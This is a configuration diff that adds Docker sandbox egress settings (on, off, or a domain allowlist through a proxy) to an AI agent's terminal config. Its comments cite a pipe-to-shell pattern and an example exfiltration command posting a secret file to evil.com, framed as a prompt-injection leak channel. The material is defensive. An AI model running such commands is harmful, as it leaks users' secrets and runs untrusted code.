@@ -315,6 +315,32 @@ terminal:
   container_memory: 5120        # Memory in MB (5120 = 5GB)
   container_disk: 51200         # Disk in MB (51200 = 50GB)
   container_persistent: true    # Persist filesystem across sessions (false = ephemeral)
+  #
+  # --- Sandbox egress control (docker backend) ---
+  # SECURITY: the approval gate (tools/approval.py) blocks destructive commands and
+  # remote-code-execution (`curl ... | sh`), but does NOT block outbound data
+  # exfiltration (`curl -X POST evil.com -d @secret`). Network egress is the channel
+  # a prompt-injection would use to leak data. Restrict it for untrusted workloads.
+  #   "on"        - full network (default, current behavior)
+  #   "off"       - no network at all (--network=none)
+  #   "allowlist" - HTTP(S) only, routed through a domain-filtered proxy on an
+  #                 internal network; raw/non-proxied egress has no route out.
+  # Any other value fails closed to "off" (a typo never grants full network).
+  container_network: "on"
+  # Domains reachable in "allowlist" mode (no scheme/path; leading "*." wildcard ok;
+  # IP literals must match exactly). Empty list + allowlist mode = deny-all.
+  # Example below allows package installs + git:
+  # container_network: "allowlist"
+  # container_network_allowlist:
+  #   - "pypi.org"
+  #   - "files.pythonhosted.org"
+  #   - "registry.npmjs.org"
+  #   - "github.com"
+  #   - "objects.githubusercontent.com"
+  #
+  # The proxy container/network (label "hermes.egress") is shared per-allowlist
+  # and pruned automatically when no sandbox uses it. Manual cleanup:
+  #   docker ps -a --filter label=hermes.egress   /   docker network ls --filter label=hermes.egress
 
 # -----------------------------------------------------------------------------
 # SUDO SUPPORT (works with ALL backends above)
